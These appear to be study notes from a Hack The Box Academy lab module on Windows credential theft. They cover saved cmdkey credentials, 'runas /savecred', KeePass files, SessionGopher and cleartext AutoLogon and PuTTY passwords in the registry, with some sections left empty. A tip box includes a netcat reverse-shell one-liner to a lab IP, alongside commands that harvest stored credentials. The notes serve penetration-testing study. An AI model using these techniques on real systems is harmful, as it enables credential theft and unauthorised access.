# Section 23: Further Credential Theft

---


The `cmdkey` command can be used to:
- Create stored usernames and passwords
- List existing stored credentials
- Delete stored credentials

### Use Cases

Users may store credentials for:
- Access to specific hosts
- Terminal Services/Remote Desktop connections (connect without entering password each time)

### Listing Saved Credentials

```cmd
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

> [!note] Output Analysis
> - **Target:** `TERMSRV/SQL01` — credentials saved for RDP to SQL01
> - **Type:** Generic
> - **User:** inlanefreight\bob — domain user credentials stored locally

### Exploiting Saved Credentials

When attempting to RDP to the target host, the saved credentials will be used automatically.

#### Running Commands as Another User

We can reuse stored credentials with `runas /savecred` to:
- Send a reverse shell as that user
- Run a binary in their security context
- Launch a PowerShell or CMD console

```powershell
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

> [!tip] Use Cases for runas /savecred
> - Spawn a reverse shell: `runas /savecred /user:inlanefreight\bob "nc.exe -e cmd.exe 10.10.14.3 4444"`
> - Launch elevated CMD: `runas /savecred /user:inlanefreight\bob "cmd.exe"`
> - Execute malicious binary: `runas /savecred /user:inlanefreight\bob "C:\temp\payload.exe"`

## Password Managers

### Overview

Many companies provide password managers to users in various forms:

| Type                     | Examples           |
| ------------------------ | ------------------ |
| **Desktop Applications** | KeePass            |
| **Cloud-Based**          | 1Password          |
| **Enterprise Vaults**    | Thycotic, CyberArk |

### Why Password Managers Are High-Value Targets

Access to a password manager — especially one used by IT staff or entire departments — may lead to:
- Administrator-level access to network devices
- Access to servers and databases
- Access to high-value targets

### KeePass Attack

#### Identifying KeePass Databases

KeePass stores its database as `.kdbx` files locally on the host.

**Locations to search:**
- Servers
- Workstations
- File shares

```powershell
# Search for KeePass database files
Get-ChildItem -Path C:\ -Recurse -Filter "*.kdbx" -ErrorAction SilentlyContinue
```

#### Step 1: Extract KeePass Hash

## SessionGopher — Remote Session Credentials

### Overview

SessionGopher extracts saved credentials for remote access tools:
- PuTTY
- WinSCP
- FileZilla
- SuperPuTTY
- Remote Desktop (RDP)

### How it Works

- Written in PowerShell
- Searches `HKEY_USERS` hive for all users who have logged into the host
- Decrypts any saved session information found
- Can also search drives for:
  - PuTTY private key files (`.ppk`)
  - Remote Desktop files (`.rdp`)
  - RSA files (`.sdtid`)

## Clear-Text Password Storage in the Registry

## Windows AutoLogon

### Overview

Windows Autologon allows a system to automatically log on to a specific user account without requiring manual input at each startup.

**Common usage scenarios:**
- Single-user systems
- Kiosk machines
- Environments where convenience outweighs security

### Security Risk

Once configured, the username and password are stored in the registry **in clear text**.

### AutoLogon Registry Location

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

> [!note] Access
> This registry key can be accessed by standard users — no admin required to read

### Key Registry Values

| Key                 | Description                                          |
| ------------------- | ---------------------------------------------------- |
| **AutoAdminLogon**  | `1` = enabled, `0` = disabled                        |
| **DefaultUserName** | Username of the account that auto-logs on            |
| **DefaultPassword** | Password for the auto-logon user account (cleartext) |

### Enumerating AutoLogon with reg.exe

```cmd
C:\htb> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

> [!success] Credentials Found
> - **Username:** htb-student
> - **Password:** HTB_@cademy_stdnt!

> [!tip] Secure Alternative
> If AutoLogon must be configured, use **Autologon.exe** from the Sysinternals suite.
> This will encrypt the password as an **LSA secret** rather than storing it in cleartext.

## PuTTY Saved Sessions

### Vulnerability

For PuTTY sessions utilizing a **proxy connection**, when the session is saved, the credentials are stored in the registry **in clear text**.

### Registry Location

```cmd
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

> [!note] Access Control
> - Registry key ACLs are tied to the user account that configured the session
> - Must be logged in as that user to access via `HKEY_CURRENT_USER`
> - With admin privileges, accessible in `HKEY_USERS` under the user's hive

### Step 1: Enumerate Saved Sessions

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

### Step 2: Inspect Session Keys and Values

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!
```

> [!success] Admin Credentials Found
> - **Proxy Username:** administrator
> - **Proxy Password:** 1_4m_th3_@cademy_4dm1n!
>
> Scenario: IT administrator configured PuTTY for a user using their own admin credentials in the proxy settings — a common mistake. Credentials can be extracted and reused across the network.

> [!note] Registry Reference
> For additional information on reg.exe and working with the registry, check out the Introduction to Windows Command Line module.

## Credential Theft — Quick Reference

### Tools Summary

| Tool | Targets | Command |
|---|---|---|
| **cmdkey** | Windows Credential Manager | `cmdkey /list` |

## Key Takeaways

- [ ] `cmdkey /list` reveals stored Windows credentials usable with `runas /savecred`
- [ ] SharpChrome can decrypt Chrome saved logins; generates Windows security events (4688, 16385, 4662, 4663)
- [ ] KeePass .kdbx files can be cracked offline using keepass2john + hashcat (`-m 13400`)
- [ ] LaZagne covers the broadest range of credential sources across many application types
- [ ] SessionGopher extracts saved sessions for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP
- [ ] Windows AutoLogon stores credentials in **cleartext** in `HKLM\...\Winlogon` — readable by standard users
- [ ] PuTTY proxy sessions store proxy credentials in cleartext in `HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\`
- [ ] WiFi passwords can be retrieved with `netsh wlan show profile <name> key=clear`
- [ ] Always check registry locations manually even when tools are unavailable
- [ ] Admin credentials used in personal tools (PuTTY, browsers) are common and high-value findings
